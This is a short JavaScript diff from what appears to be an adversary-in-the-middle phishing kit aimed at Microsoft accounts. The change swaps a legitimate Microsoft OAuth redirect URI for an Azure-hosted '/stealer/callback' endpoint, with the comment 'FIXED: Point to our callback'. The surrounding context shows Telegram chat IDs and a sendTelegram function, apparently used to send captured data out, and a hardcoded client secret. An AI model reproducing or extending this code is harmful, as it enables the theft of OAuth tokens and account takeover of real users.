@@ -10,7 +10,7 @@ const TELEGRAM_CHAT_ID2 = "6263177378";
 // OAuth configuration - Using working client ID for consumer accounts
 const client_id = '14d82eec-204b-4c2f-b7e8-296a70dab67e'; // Microsoft Graph CLI - works with consumers
 const client_secret = process.env.AZURE_CLIENT_SECRET || 'DVd8Q~d22sfagk12YCUETKU1x5OS8-s~Mt92_bXa';
-const redirect_uri = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
+const redirect_uri = 'https://aitm-func-new-1754085350.azurewebsites.net/stealer/callback'; // FIXED: Point to our callback
 const token_endpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
 
 async function sendTelegram(message, isSecondary = false) {
